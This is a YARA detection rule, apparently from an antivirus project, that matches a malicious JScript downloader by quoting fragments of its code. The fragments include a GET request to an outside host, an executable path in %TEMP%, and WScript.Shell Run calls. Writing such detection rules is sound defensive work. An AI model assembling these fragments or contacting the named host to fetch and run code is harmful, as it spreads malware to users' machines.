rule sig_20160329_88a69a70267d807e1a4591b073472f7c {
  meta:
    description = "datamaliciousorder - file 20160329_88a69a70267d807e1a4591b073472f7c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "156a8ea439c68558c96d714232145253d665e1ef79f716564be4dac19e3bfe78"

  strings:
    $s1  = "Qu[c](\"GET\", \"http://digimacro.com.br/m8isda\", false);" fullword ascii
    $s2  = "function E() {return dj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ug1o6SRSZ3z8mAYX.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[M0](vS() * 11); if (Qu[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function M(vK, k){X = X * 1; return vK - k;};" fullword ascii
    $s5  = "var dj = function L() {return WScript[R](\"WScript.Shell\");}(), b = 11;" fullword ascii
    $s6  = "function Ms(){return \"\" + YL;};" fullword ascii
    $s7  = "function lY(WW){dj[\"Run\"](WW, X, X);};" fullword ascii
    $s8  = "function gY() {return ((NA == true) && (NA == uF)) ? 1 : X;};" fullword ascii
    $s9  = "function lq(){return R;};" fullword ascii
    $s10 = "return M(U, Gg);" fullword ascii
    $s11 = "function D(ut) {var ia = (1, 2, 3, 4, 5, ut); return ia;};" fullword ascii
    $s12 = "function vS(){return 22;};" fullword ascii
    $s13 = "function D0()" fullword ascii
    $s14 = "var C = new this[\"Date\"]();" fullword ascii
    $s15 = " while (kC){" fullword ascii
    $s16 = "var i = false;" fullword ascii
    $s17 = "NA = true; " fullword ascii
    $s18 = "var NA = false;" fullword ascii
    $s19 = "uF = true; " fullword ascii
    $s20 = "var uF = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}